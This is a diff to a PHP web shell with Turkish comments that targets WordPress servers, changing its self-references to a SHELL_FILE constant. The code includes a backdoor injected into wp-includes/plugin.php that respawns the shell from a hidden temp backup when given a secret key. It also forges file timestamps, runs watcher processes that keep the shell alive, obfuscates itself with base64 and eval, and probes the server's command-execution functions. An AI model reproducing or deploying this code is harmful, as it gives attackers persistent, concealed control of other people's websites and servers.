@@ -26,8 +26,8 @@ if (isset($_GET['spawn']) && $_GET['spawn'] === $SPAWN_KEY) {
     $backup_file = sys_get_temp_dir() . '/.wp_bak_cache';
     if(file_exists($backup_file)) {
         $content = file_get_contents($backup_file);
-        file_put_contents(__FILE__, $content);
-        @touch(__FILE__, time() - 63072000);
+        file_put_contents(SHELL_FILE, $content);
+        @touch(SHELL_FILE, time() - 63072000);
         exit("Spawn Success.");
     }
 }
@@ -130,7 +130,7 @@ function manualTimestomp($t, $cd = null) { $ts = $cd ? strtotime($cd) : (file_ex
 // ============== YARDIMCI FONKSİYONLAR SONU ==============
 
 // ============== WATCHER SİSTEMİ ==============
-$PERSISTENCE_STORE = sys_get_temp_dir() . '/.ptm_' . substr(md5(__FILE__), 0, 8) . '.json';
+$PERSISTENCE_STORE = sys_get_temp_dir() . '/.ptm_' . substr(md5(SHELL_FILE), 0, 8) . '.json';
 function getWatchers() { global $PERSISTENCE_STORE; return file_exists($PERSISTENCE_STORE) ? json_decode(file_get_contents($PERSISTENCE_STORE), true) ?: [] : []; }
 function saveWatchers($d) { global $PERSISTENCE_STORE; @file_put_contents($PERSISTENCE_STORE, json_encode($d)); }
 function deployWatcher($fp) {
@@ -183,7 +183,7 @@ function killPhoenix() {
     $bf = $cf . '.bak_' . time();
     if (!copy($cf, $bf)) return "❌ Yedek alınamadı.";
     $st = $GLOBALS['SPAWN_KEY'];
-    $pld = "\nif(isset(\$_GET['spawn'])&&\$_GET['spawn']=='$st'){\$b='".sys_get_temp_dir()."/.wp_bak_cache';if(file_exists(\$b)){file_put_contents('".__FILE__."',file_get_contents(\$b));@touch('".__FILE__."',time()-63072000);exit('Spawned!');}}";
+    $pld = "\nif(isset(\$_GET['spawn'])&&\$_GET['spawn']=='$st'){\$b='".sys_get_temp_dir()."/.wp_bak_cache';if(file_exists(\$b)){file_put_contents('".SHELL_FILE."',file_get_contents(\$b));@touch('".SHELL_FILE."',time()-63072000);exit('Spawned!');}}";
     $c = file_get_contents($cf);
     if (strpos($c, $st) === false) { @unlink($bf); return "⏺️ Phoenix zaten aktif değil."; }
     $nc = str_replace($pld, '', $c, $cnt);
@@ -233,26 +233,26 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     if (isset($_POST['global_unlock'])) { killGlobalShield($rootPath); $msg = "🔓 FILE SHIELD PASİF! (İzinler geri yüklendi)"; }
     if (isset($_POST['infect_core'])) {
         $cf = $_SERVER['DOCUMENT_ROOT'] . '/wp-includes/plugin.php';
-        file_put_contents(sys_get_temp_dir() . '/.wp_bak_cache', file_get_contents(__FILE__));
+        file_put_contents(sys_get_temp_dir() . '/.wp_bak_cache', file_get_contents(SHELL_FILE));
         $st = $SPAWN_KEY;
-        $pld = "\nif(isset(\$_GET['spawn'])&&\$_GET['spawn']=='$st'){\$b='".sys_get_temp_dir()."/.wp_bak_cache';if(file_exists(\$b)){file_put_contents('".__FILE__."',file_get_contents(\$b));@touch('".__FILE__."',time()-63072000);exit('Spawned!');}}";
+        $pld = "\nif(isset(\$_GET['spawn'])&&\$_GET['spawn']=='$st'){\$b='".sys_get_temp_dir()."/.wp_bak_cache';if(file_exists(\$b)){file_put_contents('".SHELL_FILE."',file_get_contents(\$b));@touch('".SHELL_FILE."',time()-63072000);exit('Spawned!');}}";
         if (strpos(file_get_contents($cf), $st) === false) { file_put_contents($cf, file_get_contents($cf) . $pld); }
         $msg = "🐣 PHOENIX AKTİF!";
     }
     if (isset($_POST['kill_phoenix'])) { $msg = killPhoenix(); }
     if (isset($_POST['protect_self'])) {
-        $pid = deployWatcher(__FILE__);
-        $w = getWatchers(); $w[realpath(__FILE__)] = ['filename' => basename(__FILE__), 'pid' => $pid, 'type' => 'SYSTEM'];
+        $pid = deployWatcher(SHELL_FILE);
+        $w = getWatchers(); $w[realpath(SHELL_FILE)] = ['filename' => basename(SHELL_FILE), 'pid' => $pid, 'type' => 'SYSTEM'];
         saveWatchers($w); $msg = "🔥 KENDİNİ KORUMAYA ALDI!";
     }
-    if (isset($_POST['set_stealth'])) { $_SESSION['stealth_date'] = !empty($_POST['custom_date']) ? $_POST['custom_date'] : null; manualTimestomp(__FILE__, $_SESSION['stealth_date']); $msg = "⏳ Tarih sabitlendi."; }
+    if (isset($_POST['set_stealth'])) { $_SESSION['stealth_date'] = !empty($_POST['custom_date']) ? $_POST['custom_date'] : null; manualTimestomp(SHELL_FILE, $_SESSION['stealth_date']); $msg = "⏳ Tarih sabitlendi."; }
     if (isset($_POST['lock_config'])) { $msg = lockWpConfig(); }
     if (isset($_POST['unlock_config'])) { $msg = unlockWpConfig(); }
     if (isset($_POST['bypass_test'])) { $msg = "🧪 Bypass Test Sonucu:\n" . safeRun('id'); }
 
     // ====== SELF OBFUSCATOR (TEK KATMANLI, HER BASIŞTA YENİDEN ENCODE) ======
     if (isset($_POST['obfuscate_self'])) {
-        $originalFile = __FILE__;
+        $originalFile = SHELL_FILE;
         $source = file_get_contents($originalFile);
         $obfuscated = '<?php eval(\'?>\'.base64_decode(\'' . base64_encode($source) . '\').\'<?php \'); ?>';
         if (file_put_contents($originalFile, $obfuscated)) {
@@ -298,7 +298,7 @@ if(isset($_GET['stop_watch'])) {
 // ============== WATCHER DURDURMA SONU ==============
 
 // ============== SELF DESTRUCT ==============
-if (isset($_GET['self_destruct'])) { $w = getWatchers(); foreach($w as $p => $i) { if(is_numeric($i['pid'])) safeRun("kill -9 ".$i['pid']); } @unlink($PERSISTENCE_STORE); @unlink(__FILE__); exit("Cleaned."); }
+if (isset($_GET['self_destruct'])) { $w = getWatchers(); foreach($w as $p => $i) { if(is_numeric($i['pid'])) safeRun("kill -9 ".$i['pid']); } @unlink($PERSISTENCE_STORE); @unlink(SHELL_FILE); exit("Cleaned."); }
 // ============== SELF DESTRUCT SONU ==============
 
 // ============== WP VERİTABANI ==============
@@ -327,7 +327,7 @@ if (isset($_GET['action']) && $_GET['action'] === 'download' && isset($_GET['fil
 
 // ============== DURUM KONTROLLERİ ==============
 $shieldActive = file_exists($shieldFlagFile);
-$healActive = isset(getWatchers()[realpath(__FILE__)]);
+$healActive = isset(getWatchers()[realpath(SHELL_FILE)]);
 $phoenixActive = false; $cf = $_SERVER['DOCUMENT_ROOT'].'/wp-includes/plugin.php'; if(file_exists($cf)) { $phoenixActive = (strpos(file_get_contents($cf), $SPAWN_KEY) !== false); }
 $stealthActive = !empty($_SESSION['stealth_date']);
 $configLockActive = false; $cp = $_SERVER['DOCUMENT_ROOT'].'/wp-config.php'; if(file_exists($cp)) { $cc = file_get_contents($cp); $configLockActive = (strpos($cc, 'DISALLOW_FILE_EDIT') !== false && strpos($cc, 'DISALLOW_FILE_MODS') !== false); }
@@ -419,7 +419,7 @@ $runOk = isAvailable($func_sh) || isAvailable($func_po) || isAvailable($func_pp)
     <div class="panel">
 <?php
 switch ($action) {
-    case 'info': ?><h3>Sistem Bilgisi</h3><pre>Sunucu: <?= php_uname()."\n" ?>IP: <?= $_SERVER['SERVER_ADDR'] ?? gethostbyname(gethostname())."\n" ?>Yazılım: <?= $_SERVER['SERVER_SOFTWARE']."\n" ?>Kullanıcı: <?= get_current_user()."\n" ?>Document Root: <?= $rootPath."\n" ?>Panel: <?= __FILE__."\n" ?>WordPress: <?= file_exists('wp-config.php')?'Evet':'Hayır'."\n" ?>File Shield: <?= $shieldActive?'🔒 Aktif':'🔓 Pasif'."\n" ?><?php if(file_exists('wp-includes/version.php')){ include 'wp-includes/version.php'; echo "WP Versiyon: ".($wp_version??'Bilinmiyor')."\n"; } ?></pre><h3>🛠️ Çalıştırma Metot Durumu</h3><pre><?= $func_sh ?>: <?= isAvailable($func_sh)?'✅':'❌'."\n" ?><?= $func_sy ?>: <?= isAvailable($func_sy)?'✅':'❌'."\n" ?><?= $func_ex ?>: <?= isAvailable($func_ex)?'✅':'❌'."\n" ?><?= $func_pt ?>: <?= isAvailable($func_pt)?'✅':'❌'."\n" ?><?= $func_po ?>: <?= isAvailable($func_po)?'✅':'❌'."\n" ?><?= $func_pp ?>: <?= isAvailable($func_pp)?'✅':'❌'."\n" ?><?= $func_pc ?>: <?= isAvailable($func_pc)?'✅':'❌'."\n" ?></pre><?php break;
+    case 'info': ?><h3>Sistem Bilgisi</h3><pre>Sunucu: <?= php_uname()."\n" ?>IP: <?= $_SERVER['SERVER_ADDR'] ?? gethostbyname(gethostname())."\n" ?>Yazılım: <?= $_SERVER['SERVER_SOFTWARE']."\n" ?>Kullanıcı: <?= get_current_user()."\n" ?>Document Root: <?= $rootPath."\n" ?>Panel: <?= SHELL_FILE."\n" ?>WordPress: <?= file_exists('wp-config.php')?'Evet':'Hayır'."\n" ?>File Shield: <?= $shieldActive?'🔒 Aktif':'🔓 Pasif'."\n" ?><?php if(file_exists('wp-includes/version.php')){ include 'wp-includes/version.php'; echo "WP Versiyon: ".($wp_version??'Bilinmiyor')."\n"; } ?></pre><h3>🛠️ Çalıştırma Metot Durumu</h3><pre><?= $func_sh ?>: <?= isAvailable($func_sh)?'✅':'❌'."\n" ?><?= $func_sy ?>: <?= isAvailable($func_sy)?'✅':'❌'."\n" ?><?= $func_ex ?>: <?= isAvailable($func_ex)?'✅':'❌'."\n" ?><?= $func_pt ?>: <?= isAvailable($func_pt)?'✅':'❌'."\n" ?><?= $func_po ?>: <?= isAvailable($func_po)?'✅':'❌'."\n" ?><?= $func_pp ?>: <?= isAvailable($func_pp)?'✅':'❌'."\n" ?><?= $func_pc ?>: <?= isAvailable($func_pc)?'✅':'❌'."\n" ?></pre><?php break;
     case 'protect': if(isset($_GET['file'])){$f=realpath($_GET['file']);if($f&&is_file($f)&&strpos($f,$rootPath)===0){$pid=deployWatcher($f);manualTimestomp($f,@$_SESSION['stealth_date']);$w=getWatchers();$w[realpath($f)]=['filename'=>basename($f),'pid'=>$pid,'type'=>'USER'];saveWatchers($w);$msg="🔒 Dosya korumaya alındı: ".basename($f);}else{$msg="❌ Geçersiz dosya!";}}$action='files';
     case 'delete': if(isset($_GET['file'])){$f=realpath($_GET['file']);if($f&&is_file($f)&&strpos($f,$rootPath)===0){if(@unlink($f)){$msg="🗑️ Dosya silindi: ".basename($f);}else{$msg="❌ Dosya silinemedi!";}}else{$msg="❌ Geçersiz dosya!";}}$action='files';
     case 'files':
